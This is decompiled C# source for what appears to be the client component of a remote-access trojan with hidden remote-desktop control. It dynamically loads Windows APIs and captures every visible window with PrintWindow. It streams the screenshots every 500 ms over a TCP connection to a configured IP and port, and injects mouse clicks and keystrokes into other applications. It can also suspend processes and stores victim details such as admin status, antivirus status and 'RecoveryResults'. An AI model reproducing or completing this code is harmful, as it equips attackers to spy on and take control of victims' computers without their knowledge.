using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Runtime.Serialization.Formatters;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace DLL.Functions
{
	// Token: 0x02000005 RID: 5
	public static class Outils
	{
		// Token: 0x0600002B RID: 43
		[DllImport("kernel32", SetLastError = true)]
		public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

		// Token: 0x0600002C RID: 44
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);

		// Token: 0x0600002D RID: 45 RVA: 0x00003A77 File Offset: 0x00001C77
		public static CreateApi LoadApi<CreateApi>(string name, string method)
		{
			return Conversions.ToGenericParameter<CreateApi>(Marshal.GetDelegateForFunctionPointer(Outils.GetProcAddress(Outils.LoadLibraryA(ref name), ref method), typeof(CreateApi)));
		}

		// Token: 0x0600002E RID: 46
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

		// Token: 0x0600002F RID: 47
		[DllImport("user32.dll", SetLastError = true)]
		public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);

		// Token: 0x06000030 RID: 48
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

		// Token: 0x06000031 RID: 49
		[DllImport("user32.dll", EntryPoint = "FindWindowEx", SetLastError = true)]
		public static extern IntPtr FindWindowEx2(IntPtr hWnd1, IntPtr hWnd2, IntPtr lpsz1, string lpsz2);

		// Token: 0x06000032 RID: 50
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr OpenThread(Outils.ThreadAccess dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

		// Token: 0x06000033 RID: 51
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern uint SuspendThread(IntPtr hThread);

		// Token: 0x06000034 RID: 52
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool CloseHandle(IntPtr hHandle);

		// Token: 0x06000035 RID: 53
		[DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern uint ResumeThread(IntPtr hThread);

		// Token: 0x06000036 RID: 54 RVA: 0x00003A9C File Offset: 0x00001C9C
		public static IntPtr FindHandle(string title)
		{
			Outils.collection = new List<string>();
			Outils.collection2 = new List<IntPtr>();
			checked
			{
				Outils.EnumDelegate lpEnumCallbackFunction = delegate(IntPtr hWnd, int lParam)
				{
					bool flag = false;
					bool result;
					try
					{
						StringBuilder stringBuilder = new StringBuilder(255);
						IntPtr hWnd2 = hWnd;
						int countOfChars = stringBuilder.Capacity + 1;
						IntPtr zero = IntPtr.Zero;
						int num = (int)Outils.SendMessageTimeoutText(hWnd2, 13, countOfChars, stringBuilder, 2, 1000U, out zero);
						string text = stringBuilder.ToString();
						if (Outils.IsWindowVisible(hWnd) && !string.IsNullOrEmpty(text))
						{
							object instance = Outils.collection2;
							object[] array = new object[]
							{
								hWnd
							};
							object[] array2 = array;
							bool[] array3 = new bool[]
							{
								true
							};
							bool[] array4 = array3;
							NewLateBinding.LateCall(instance, null, "Add", array, null, null, array3, true);
							if (array4[0])
							{
								hWnd = (IntPtr)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(IntPtr));
							}
							Outils.collection.Add(text);
						}
						flag = true;
						result = flag;
					}
					catch (Exception ex)
					{
						result = flag;
					}
					return result;
				};
				Outils.EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero);
				int i = Outils.collection.Count - 1;
				while (i >= 0)
				{
					if (Outils.collection[i].ToLower().Contains(title.ToLower()))
					{
						object obj = NewLateBinding.LateIndexGet(Outils.collection2, new object[]
						{
							i
						}, null);
						if (obj == null)
						{
							return unchecked((IntPtr)0);
						}
						return (IntPtr)obj;
					}
					else
					{
						i += -1;
					}
				}
			}
			return (IntPtr)0;
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00003B54 File Offset: 0x00001D54
		public static void SendInformation(Stream stream, object message)
		{
			if (message == null)
			{
				return;
			}
			BinaryFormatter binaryFormatter = new BinaryFormatter();
			binaryFormatter.AssemblyFormat = FormatterAssemblyStyle.Simple;
			binaryFormatter.TypeFormat = FormatterTypeStyle.TypesAlways;
			binaryFormatter.FilterLevel = TypeFilterLevel.Full;
			TcpClient client = Outils.Client;
			checked
			{
				lock (client)
				{
					object objectValue = RuntimeHelpers.GetObjectValue(message);
					MemoryStream memoryStream = new MemoryStream();
					binaryFormatter.Serialize(memoryStream, RuntimeHelpers.GetObjectValue(objectValue));
					ulong num = (ulong)memoryStream.Position;
					Outils.Client.GetStream().Write(BitConverter.GetBytes(num), 0, 8);
					byte[] buffer = memoryStream.GetBuffer();
					Outils.Client.GetStream().Write(buffer, 0, (int)num);
					memoryStream.Close();
					memoryStream.Dispose();
				}
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00003C1C File Offset: 0x00001E1C
		public static object IsFileOpen(FileInfo file)
		{
			object result = null;
			if (file.Exists)
			{
				try
				{
					file.Open(FileMode.Open, FileAccess.ReadWrite, FileShare.None).Close();
					result = false;
					return result;
				}
				catch (Exception ex)
				{
					if (ex is IOException)
					{
						result = true;
						return result;
					}
					return result;
				}
				return result;
			}
			return result;
		}

		// Token: 0x06000039 RID: 57 RVA: 0x00003C88 File Offset: 0x00001E88
		public static void SuspendProcess(Process process)
		{
			IEnumerator enumerator = null;
			try
			{
				foreach (object obj in process.Threads)
				{
					ProcessThread processThread = (ProcessThread)obj;
					IntPtr intPtr = Outils.OpenThread(Outils.ThreadAccess.SUSPEND_RESUME, false, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						Outils.SuspendThread(intPtr);
						Outils.CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600003A RID: 58 RVA: 0x00003D0C File Offset: 0x00001F0C
		public static void ResumeProcess(Process process)
		{
			IEnumerator enumerator = null;
			try
			{
				foreach (object obj in process.Threads)
				{
					ProcessThread processThread = (ProcessThread)obj;
					IntPtr intPtr = Outils.OpenThread(Outils.ThreadAccess.SUSPEND_RESUME, false, checked((uint)processThread.Id));
					if (intPtr != IntPtr.Zero)
					{
						Outils.ResumeThread(intPtr);
						Outils.CloseHandle(intPtr);
					}
				}
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}

		// Token: 0x0600003B RID: 59 RVA: 0x00003D90 File Offset: 0x00001F90
		public static void PostClickLD(int x, int y)
		{
			IntPtr intPtr = Outils.lastactive = Outils.WindowFromPoint(new Point(x, y));
			Outils.RECT rect = default(Outils.RECT);
			Outils.GetWindowRect(intPtr, ref rect);
			checked
			{
				Point point = new Point(x - rect.Left, y - rect.Top);
				IntPtr value = Outils.FindWindow("#32768", null);
				if (value != IntPtr.Zero)
				{
					Outils.contextmenu = value;
					IntPtr lParam = (IntPtr)Outils.MakeLParam(x, y);
					Outils.PostMessage(Outils.contextmenu, 513U, new IntPtr(1), lParam);
					Outils.rightclicked = true;
					return;
				}
				if (Outils.GetParent(intPtr) == (IntPtr)0 && y - rect.Top < Outils.TitleBarHeight)
				{
					Outils.lastactivebar = intPtr;
					Outils.PostMessage(intPtr, 513U, (IntPtr)1, (IntPtr)Outils.MakeLParam(x - rect.Left, y - rect.Top));
					Outils.startxpos = x;
					Outils.startypos = y;
					Outils.handletomove = intPtr;
					Outils.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 3U);
					Outils.SetWindowPos(intPtr, new IntPtr(-1), 0, 0, 0, 0, 3U);
					Outils.SetWindowPos(intPtr, new IntPtr(-2), 0, 0, 0, 0, 67U);
					return;
				}
				if (Outils.GetParent(intPtr) == (IntPtr)0 && point.X > rect.Right - rect.Left - 10 && point.Y > rect.Bottom - rect.Top - 10)
				{
					Outils.startwidth = x;
					Outils.startheight = y;
					Outils.handletoresize = intPtr;
					return;
				}
				Outils.PostMessage(intPtr, 513U, (IntPtr)1, (IntPtr)Outils.MakeLParam(x - rect.Left, y - rect.Top));
			}
		}

		// Token: 0x0600003C RID: 60 RVA: 0x00003F60 File Offset: 0x00002160
		public static void PostClickLU(int x, int y)
		{
			IntPtr hWnd = Outils.WindowFromPoint(new Point(x, y));
			Outils.RECT rect = default(Outils.RECT);
			Outils.GetWindowRect(hWnd, ref rect);
			if (Outils.rightclicked)
			{
				Outils.PostMessage(Outils.contextmenu, 514U, new IntPtr(1), (IntPtr)Outils.MakeLParam(x, y));
				Outils.rightclicked = false;
				Outils.contextmenu = IntPtr.Zero;
				return;
			}
			checked
			{
				if (Outils.startxpos > 0 | Outils.startypos > 0)
				{
					Outils.PostMessage(Outils.handletomove, 514U, (IntPtr)0L, (IntPtr)Outils.MakeLParam(x - rect.Left, y - rect.Top));
					Outils.RECT rect2 = default(Outils.RECT);
					Outils.GetWindowRect(Outils.handletomove, ref rect2);
					int num = x - Outils.startxpos;
					int num2 = y - Outils.startypos;
					int num3 = rect2.Left + num;
					int num4 = rect2.Top + num2;
					Outils.SetWindowPos(Outils.handletomove, new IntPtr(0), rect2.Left + num, rect2.Top + num2, rect2.Right - rect2.Left, rect2.Bottom - rect2.Top, 64U);
					Outils.startxpos = 0;
					Outils.startypos = 0;
					Outils.handletomove = IntPtr.Zero;
					return;
				}
				if (Outils.startwidth > 0 | Outils.startheight > 0)
				{
					Outils.RECT rect3 = default(Outils.RECT);
					Outils.GetWindowRect(Outils.handletoresize, ref rect3);
					int num5 = x - Outils.startwidth;
					int num6 = y - Outils.startheight;
					int cx = rect3.Right - rect3.Left + num5;
					int cy = rect3.Bottom - rect3.Top + num6;
					Outils.SetWindowPos(Outils.handletoresize, new IntPtr(0), rect3.Left, rect3.Top, cx, cy, 64U);
					Outils.startwidth = 0;
					Outils.startheight = 0;
					Outils.handletoresize = IntPtr.Zero;
					return;
				}
				Outils.PostMessage(hWnd, 514U, (IntPtr)0L, (IntPtr)Outils.MakeLParam(x - rect.Left, y - rect.Top));
			}
		}

		// Token: 0x0600003D RID: 61 RVA: 0x0000417C File Offset: 0x0000237C
		public static void PostClickRD(int x, int y)
		{
			IntPtr hWnd = Outils.WindowFromPoint(new Point(x, y));
			Outils.RECT rect = default(Outils.RECT);
			Outils.GetWindowRect(hWnd, ref rect);
			checked
			{
				new Point(x - rect.Left, y - rect.Top);
				Outils.PostMessage(Outils.lastactive = Outils.WindowFromPoint(new Point(x, y)), 516U, (IntPtr)0L, (IntPtr)Outils.MakeLParam(x - rect.Left, y - rect.Top));
			}
		}

		// Token: 0x0600003E RID: 62 RVA: 0x0000420C File Offset: 0x0000240C
		public static void PostClickRU(int x, int y)
		{
			IntPtr hWnd = Outils.WindowFromPoint(new Point(x, y));
			Outils.RECT rect = default(Outils.RECT);
			Outils.GetWindowRect(hWnd, ref rect);
			checked
			{
				new Point(x - rect.Left, y - rect.Top);
				Outils.PostMessage(Outils.WindowFromPoint(new Point(x, y)), 517U, (IntPtr)0L, (IntPtr)Outils.MakeLParam(x - rect.Left, y - rect.Top));
			}
		}

		// Token: 0x0600003F RID: 63 RVA: 0x00004294 File Offset: 0x00002494
		public static void PostDblClk(int x, int y)
		{
			IntPtr hWnd = Outils.WindowFromPoint(new Point(x, y));
			Outils.RECT rect = default(Outils.RECT);
			Outils.GetWindowRect(hWnd, ref rect);
			checked
			{
				new Point(x - rect.Left, y - rect.Top);
				Outils.PostMessage(Outils.lastactive = Outils.WindowFromPoint(new Point(x, y)), 515U, (IntPtr)0L, (IntPtr)Outils.MakeLParam(x - rect.Left, y - rect.Top));
			}
		}

		// Token: 0x06000040 RID: 64 RVA: 0x00004324 File Offset: 0x00002524
		public static void PostMove(int x, int y)
		{
			IntPtr hWnd = Outils.WindowFromPoint(new Point(x, y));
			Outils.RECT rect = default(Outils.RECT);
			Outils.GetWindowRect(hWnd, ref rect);
			Outils.PostMessage(hWnd, 512U, (IntPtr)0L, (IntPtr)checked(Outils.MakeLParam(x - rect.Left, y - rect.Top)));
		}

		// Token: 0x06000041 RID: 65 RVA: 0x00004388 File Offset: 0x00002588
		public static void PostKeyDown(string k)
		{
			int num = Strings.AscW(k);
			if (num == 8 || num == 13)
			{
				Outils.PostMessage(Outils.lastactive, 256U, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), Outils.CreateLParamFor_WM_KEYDOWN(1, 30, false, false));
				Outils.PostMessage(Outils.lastactive, 257U, (IntPtr)Conversions.ToInteger("&H" + Conversion.Hex(Strings.AscW(k))), Outils.CreateLParamFor_WM_KEYUP(1, 30, false));
				return;
			}
			Outils.PostMessage(Outils.lastactive, 258U, (IntPtr)Strings.AscW(k), (IntPtr)1);
		}

		// Token: 0x06000042 RID: 66 RVA: 0x00004438 File Offset: 0x00002638
		public static IntPtr KeysLParam(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore, bool State)
		{
			int num = (int)RepeatCount | (int)ScanCode << 16;
			if (IsExtendedKey)
			{
				num |= 65536;
			}
			if (DownBefore)
			{
				num |= 1073741824;
			}
			if (State)
			{
				num |= int.MinValue;
			}
			return new IntPtr(num);
		}

		// Token: 0x06000043 RID: 67 RVA: 0x00004474 File Offset: 0x00002674
		public static IntPtr CreateLParamFor_WM_KEYDOWN(ushort RepeatCount, byte ScanCode, bool IsExtendedKey, bool DownBefore)
		{
			return Outils.KeysLParam(RepeatCount, ScanCode, IsExtendedKey, DownBefore, false);
		}

		// Token: 0x06000044 RID: 68 RVA: 0x00004480 File Offset: 0x00002680
		public static IntPtr CreateLParamFor_WM_KEYUP(ushort RepeatCount, byte ScanCode, bool IsExtendedKey)
		{
			return Outils.KeysLParam(RepeatCount, ScanCode, IsExtendedKey, true, true);
		}

		// Token: 0x06000045 RID: 69 RVA: 0x0000448C File Offset: 0x0000268C
		public static int MakeLParam(int LoWord, int HiWord)
		{
			return HiWord << 16 | (LoWord & 65535);
		}

		// Token: 0x06000046 RID: 70 RVA: 0x0000449C File Offset: 0x0000269C
		public static void SCT()
		{
			for (;;)
			{
				try
				{
					Bitmap message = Outils.RenderScreenshot();
					Outils.SendInformation(Outils.nstream, message);
				}
				catch (Exception ex)
				{
				}
				Thread.Sleep(Outils.interval);
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x000044E8 File Offset: 0x000026E8
		public static Bitmap RenderScreenshot()
		{
			Bitmap bitmap = null;
			Bitmap result;
			try
			{
				List<IntPtr> t = new List<IntPtr>();
				Outils.EnumDelegate lpEnumCallbackFunction = delegate(IntPtr hWnd, int lParam)
				{
					bool flag = false;
					bool result2;
					try
					{
						if (Outils.IsWindowVisible(hWnd))
						{
							t.Add(hWnd);
						}
						flag = true;
						result2 = flag;
					}
					catch (Exception ex4)
					{
						result2 = flag;
					}
					return result2;
				};
				if (Outils.EnumDesktopWindows(IntPtr.Zero, lpEnumCallbackFunction, IntPtr.Zero))
				{
					Bitmap bitmap2 = new Bitmap(Outils.screenx, Outils.screeny);
					Bitmap bitmap3;
					ImageCodecInfo encoder;
					EncoderParameters encoderParameters;
					checked
					{
						for (int i = t.Count - 1; i >= 0; i += -1)
						{
							try
							{
								Outils.RECT rect = default(Outils.RECT);
								Outils.GetWindowRect(t[i], ref rect);
								Bitmap image = new Bitmap(rect.Right - rect.Left + 1, rect.Bottom - rect.Top + 1);
								Graphics graphics = Graphics.FromImage(image);
								IntPtr hdc = graphics.GetHdc();
								try
								{
									if (Outils.HigherThan81)
									{
										Outils.PrintWindow(t[i], hdc, 2U);
									}
									else
									{
										Outils.PrintWindow(t[i], hdc, 0U);
									}
								}
								catch (Exception ex)
								{
								}
								graphics.ReleaseHdc(hdc);
								graphics.FillRectangle(Brushes.Gray, rect.Right - rect.Left - 10, rect.Bottom - rect.Top - 10, 10, 10);
								Graphics.FromImage(bitmap2).DrawImage(image, rect.Left, rect.Top);
							}
							catch (Exception ex2)
							{
							}
						}
						bitmap3 = new Bitmap(bitmap2, (int)Math.Round(unchecked((double)Outils.screenx * Outils.resize)), (int)Math.Round(unchecked((double)Outils.screeny * Outils.resize)));
						encoder = Outils.get_Codec("image/jpeg");
						encoderParameters = new EncoderParameters(1);
					}
					encoderParameters.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)Outils.quality);
					MemoryStream stream = new MemoryStream();
					bitmap3.Save(stream, encoder, encoderParameters);
					Bitmap bitmap4 = (Bitmap)Image.FromStream(stream);
					bitmap3.Dispose();
					GC.Collect();
					bitmap = bitmap4;
					result = bitmap;
				}
				else
				{
					result = bitmap;
				}
			}
			catch (Exception ex3)
			{
				Outils.SendInformation(Outils.nstream, "60|" + ex3.ToString());
				try
				{
					bitmap = Outils.ReturnBMP();
					ProjectData.ClearProjectError();
					return bitmap;
				}
				catch (Exception ex4)
				{
				}
				result = bitmap;
			}
			return result;
		}

		// Token: 0x06000048 RID: 72 RVA: 0x000047B4 File Offset: 0x000029B4
		public static ImageCodecInfo get_Codec(string type)
		{
			if (type == null)
			{
				return null;
			}
			foreach (ImageCodecInfo imageCodecInfo in Outils.codecs)
			{
				if (Operators.CompareString(imageCodecInfo.MimeType, type, false) == 0)
				{
					return imageCodecInfo;
				}
			}
			return null;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x000047F0 File Offset: 0x000029F0
		public static Bitmap ReturnBMP()
		{
			Bitmap bitmap = new Bitmap(Outils.screenx, Outils.screeny);
			using (Graphics graphics = Graphics.FromImage(bitmap))
			{
				SolidBrush brush = (SolidBrush)Brushes.Red;
				graphics.FillRectangle(brush, 0, 0, Outils.screenx, Outils.screeny);
			}
			return bitmap;
		}

		// Token: 0x0600004A RID: 74
		[DllImport("user32.dll", CharSet = CharSet.Auto, EntryPoint = "SendMessageTimeout", SetLastError = true)]
		public static extern uint SendMessageTimeoutText(IntPtr hWnd, int Msg, int countOfChars, StringBuilder text, int flags, uint uTImeoutj, out IntPtr result);

		// Token: 0x0600004B RID: 75 RVA: 0x00004850 File Offset: 0x00002A50
		public static object Isgreaterorequalto81()
		{
			object obj = null;
			object result;
			try
			{
				OperatingSystem osversion = Environment.OSVersion;
				Version version = osversion.Version;
				if (osversion.Platform == PlatformID.Win32NT && version.Major == 6 && version.Minor != 0 && version.Minor != 1)
				{
					obj = true;
					result = obj;
				}
				else
				{
					obj = false;
					result = obj;
				}
			}
			catch (Exception ex)
			{
				result = obj;
			}
			return result;
		}

		// Token: 0x0600004C RID: 76
		[DllImport("user32.dll")]
		[return: MarshalAs(UnmanagedType.Bool)]
		public static extern bool ShowWindow(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] int nCmdShow);

		// Token: 0x0600004D RID: 77
		[DllImport("user32.dll", SetLastError = true)]
		public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

		// Token: 0x0400000C RID: 12
		public static TcpClient Client = new TcpClient();

		// Token: 0x0400000D RID: 13
		public static NetworkStream nstream;

		// Token: 0x0400000E RID: 14
		public static string ip;

		// Token: 0x0400000F RID: 15
		public static int port;

		// Token: 0x04000010 RID: 16
		public static string Identifier;

		// Token: 0x04000011 RID: 17
		public static string Mutex;

		// Token: 0x04000012 RID: 18
		public static string username;

		// Token: 0x04000013 RID: 19
		public static string isadmin;

		// Token: 0x04000014 RID: 20
		public static string avstatus;

		// Token: 0x04000015 RID: 21
		public static string RecoveryResults;

		// Token: 0x04000016 RID: 22
		public static int screenx = 1028;

		// Token: 0x04000017 RID: 23
		public static int screeny = 1028;

		// Token: 0x04000018 RID: 24
		public static IntPtr lastactive;

		// Token: 0x04000019 RID: 25
		public static IntPtr lastactivebar;

		// Token: 0x0400001A RID: 26
		public static int interval = 500;

		// Token: 0x0400001B RID: 27
		public static int quality = 50;

		// Token: 0x0400001C RID: 28
		public static double resize = 0.5;

		// Token: 0x0400001D RID: 29
		public static int TitleBarHeight;

		// Token: 0x0400001E RID: 30
		public static bool HigherThan81 = false;

		// Token: 0x0400001F RID: 31
		public static readonly Outils.DelegateIsWindowVisible IsWindowVisible = Outils.LoadApi<Outils.DelegateIsWindowVisible>("user32", "IsWindowVisible");

		// Token: 0x04000020 RID: 32
		public static readonly Outils.DelegateEnumDesktopWindows EnumDesktopWindows = Outils.LoadApi<Outils.DelegateEnumDesktopWindows>("user32", "EnumDesktopWindows");

		// Token: 0x04000021 RID: 33
		public static readonly Outils.DelegatePrintWindow PrintWindow = Outils.LoadApi<Outils.DelegatePrintWindow>("user32", "PrintWindow");

		// Token: 0x04000022 RID: 34
		public static readonly Outils.DelegateGetWindowRect GetWindowRect = Outils.LoadApi<Outils.DelegateGetWindowRect>("user32", "GetWindowRect");

		// Token: 0x04000023 RID: 35
		public static readonly Outils.DelegateWindowFromPoint WindowFromPoint = Outils.LoadApi<Outils.DelegateWindowFromPoint>("user32", "WindowFromPoint");

		// Token: 0x04000024 RID: 36
		public static readonly Outils.DelegateGetWindow GetWindow = Outils.LoadApi<Outils.DelegateGetWindow>("user32", "GetWindow");

		// Token: 0x04000025 RID: 37
		public static readonly Outils.DelegateIsZoomed IsZoomed = Outils.LoadApi<Outils.DelegateIsZoomed>("user32", "IsZoomed");

		// Token: 0x04000026 RID: 38
		public static readonly Outils.DelegateGetParent GetParent = Outils.LoadApi<Outils.DelegateGetParent>("user32", "GetParent");

		// Token: 0x04000027 RID: 39
		public static readonly Outils.DelegateGetSystemMetrics GetSystemMetrics = Outils.LoadApi<Outils.DelegateGetSystemMetrics>("user32", "GetSystemMetrics");

		// Token: 0x04000028 RID: 40
		public static int startxpos;

		// Token: 0x04000029 RID: 41
		public static int startypos = 0;

		// Token: 0x0400002A RID: 42
		public static int startwidth;

		// Token: 0x0400002B RID: 43
		public static int startheight = 0;

		// Token: 0x0400002C RID: 44
		public static IntPtr handletomove;

		// Token: 0x0400002D RID: 45
		public static IntPtr handletoresize;

		// Token: 0x0400002E RID: 46
		public static IntPtr contextmenu;

		// Token: 0x0400002F RID: 47
		public static bool rightclicked = false;

		// Token: 0x04000030 RID: 48
		public static ImageCodecInfo[] codecs = ImageCodecInfo.GetImageEncoders();

		// Token: 0x04000031 RID: 49
		public static string MPath;

		// Token: 0x04000032 RID: 50
		public static string MFile;

		// Token: 0x04000033 RID: 51
		public static Process procM = new Process();

		// Token: 0x04000034 RID: 52
		public static string tempFile;

		// Token: 0x04000035 RID: 53
		public static Computer a = new Computer();

		// Token: 0x04000036 RID: 54
		public static List<string> collection = new List<string>();

		// Token: 0x04000037 RID: 55
		public static object collection2 = new List<IntPtr>();

		// Token: 0x04000038 RID: 56
		public static Thread newt = new Thread(new ThreadStart(Outils.SCT));

		// Token: 0x0200000F RID: 15
		// (Invoke) Token: 0x06000068 RID: 104
		public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

		// Token: 0x02000010 RID: 16
		public struct RECT
		{
			// Token: 0x04000052 RID: 82
			public int Left;

			// Token: 0x04000053 RID: 83
			public int Top;

			// Token: 0x04000054 RID: 84
			public int Right;

			// Token: 0x04000055 RID: 85
			public int Bottom;
		}

		// Token: 0x02000011 RID: 17
		public enum CWPFlags
		{
			// Token: 0x04000057 RID: 87
			CWP_ALL
		}

		// Token: 0x02000012 RID: 18
		[Flags]
		public enum RedrawWindowFlags : uint
		{
			// Token: 0x04000059 RID: 89
			Invalidate = 1U,
			// Token: 0x0400005A RID: 90
			InternalPaint = 2U,
			// Token: 0x0400005B RID: 91
			Erase = 4U,
			// Token: 0x0400005C RID: 92
			Validate = 8U,
			// Token: 0x0400005D RID: 93
			NoInternalPaint = 16U,
			// Token: 0x0400005E RID: 94
			NoErase = 32U,
			// Token: 0x0400005F RID: 95
			NoChildren = 64U,
			// Token: 0x04000060 RID: 96
			AllChildren = 128U,
			// Token: 0x04000061 RID: 97
			UpdateNow = 256U,
			// Token: 0x04000062 RID: 98
			EraseNow = 512U,
			// Token: 0x04000063 RID: 99
			Frame = 1024U,
			// Token: 0x04000064 RID: 100
			NoFrame = 2048U
		}

		// Token: 0x02000013 RID: 19
		[Flags]
		public enum ThreadAccess
		{
			// Token: 0x04000066 RID: 102
			TERMINATE = 1,
			// Token: 0x04000067 RID: 103
			SUSPEND_RESUME = 2,
			// Token: 0x04000068 RID: 104
			GET_CONTEXT = 8,
			// Token: 0x04000069 RID: 105
			SET_CONTEXT = 16,
			// Token: 0x0400006A RID: 106
			SET_INFORMATION = 32,
			// Token: 0x0400006B RID: 107
			QUERY_INFORMATION = 64,
			// Token: 0x0400006C RID: 108
			SET_THREAD_TOKEN = 128,
			// Token: 0x0400006D RID: 109
			IMPERSONATE = 256,
			// Token: 0x0400006E RID: 110
			DIRECT_IMPERSONATION = 512
		}

		// Token: 0x02000014 RID: 20
		// (Invoke) Token: 0x0600006C RID: 108
		[return: MarshalAs(UnmanagedType.Bool)]
		public delegate bool DelegateIsWindowVisible(IntPtr hWnd);

		// Token: 0x02000015 RID: 21
		// (Invoke) Token: 0x06000070 RID: 112
		public delegate bool DelegateEnumDesktopWindows(IntPtr hDesktop, Outils.EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

		// Token: 0x02000016 RID: 22
		// (Invoke) Token: 0x06000074 RID: 116
		public delegate bool DelegatePrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

		// Token: 0x02000017 RID: 23
		// (Invoke) Token: 0x06000078 RID: 120
		public delegate bool DelegateGetWindowRect(IntPtr hWnd, ref Outils.RECT lpRect);

		// Token: 0x02000018 RID: 24
		// (Invoke) Token: 0x0600007C RID: 124
		public delegate IntPtr DelegateWindowFromPoint(Point p);

		// Token: 0x02000019 RID: 25
		// (Invoke) Token: 0x06000080 RID: 128
		public delegate IntPtr DelegateGetWindow(IntPtr hWnd, uint uCmd);

		// Token: 0x0200001A RID: 26
		// (Invoke) Token: 0x06000084 RID: 132
		[return: MarshalAs(UnmanagedType.Bool)]
		public delegate bool DelegateIsZoomed(IntPtr hwnd);

		// Token: 0x0200001B RID: 27
		// (Invoke) Token: 0x06000088 RID: 136
		public delegate IntPtr DelegateGetParent(IntPtr hwnd);

		// Token: 0x0200001C RID: 28
		// (Invoke) Token: 0x0600008C RID: 140
		public delegate int DelegateGetSystemMetrics(int nIndex);
	}
}
